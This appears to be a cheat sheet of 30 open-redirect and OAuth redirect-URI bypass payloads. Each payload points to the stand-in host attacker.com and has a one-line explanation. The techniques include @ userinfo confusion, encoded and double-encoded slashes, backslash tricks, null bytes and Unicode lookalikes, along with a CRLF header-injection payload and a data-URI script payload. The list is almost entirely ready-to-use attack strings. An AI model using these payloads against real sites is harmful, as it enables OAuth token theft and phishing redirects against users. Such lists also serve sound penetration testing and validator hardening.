
```
1. https://victim.com/oauth-callback?@attacker.com
   → Using `@` to trick parser (everything before @ treated as user info).

2. https://attacker.com//victim.com
   → Double slash confusion, attacker domain first.

3. ////attacker.com
   → Protocol-relative URL (browser may resolve directly to attacker).

4. https://victim.com@attacker.com
   → Userinfo injection, attacker domain after @.

5. https://attacker.com%20.victim.com
   https://attacker.com%09victim.com
   → Whitespace/tab encoded injection.

6. https://victim.com/redirect?url=https://attacker.com
   → Chaining via nested redirect endpoint.

7. %2f%2fattacker.com
   → Encoded forward slashes.

8. %252f%252fattacker.com
   → Double-encoded forward slashes.

9. https://%61ttacker.com
   → Using ASCII/hex encoding for domain letters.

10. HtTp://attacker.com
    → Case variation in scheme.

11. /..;/attacker.com
    → Path traversal + semicolon confusion.

12. https://victim.com/#https://attacker.com
    → Fragment injection (browser interprets after #).

13. https://victim.com?next=https://attacker.com
    → Classic `next` or `url` param injection.

14. /redirect/https://attacker.com
    → Path-based redirection.

15. https:attacker.com
    → Missing `//` — some parsers accept.

16. https://victim.com\@attacker.com
    → Backslash + @ confusion.

17. file://attacker.com
    → File protocol redirection (if accepted).

18. data:text/html,<script>alert(1)</script>
    → Data URI redirection (potential XSS).

19. https://victim.com/%0d%0aLocation:https://attacker.com
    → CRLF injection to add new Location header.

20. https://victim.com@attacker.com/login
    → Mixed allowed domain + attacker domain.

21.  https://victim.com%00.attacker.com
    → Null byte injection.

22. https://ⓐattacker.com
    → Unicode `@` character.

23. https://attacker.com?redirect=https://victim.com
    → Reverse nesting (victim as param).

24. ///attacker.com
    → Triple slash confusion.

25. https:///attacker.com
    → Extra slash after scheme.

26. https:////attacker.com
    → Four slashes, some parsers normalize.

27. http://victim.com@attacker.com/
    → Host misinterpretation with `@`.

28. https://victim.com%2eattacker.com
    → Dot (`.`) encoding for domain confusion.

29. https://victim.com/%2e%2e/attacker.com
    → URL encoded path traversal.

30.  https://attacker.com%3F.victim.com
    → Encoded `?` injected before victim.

```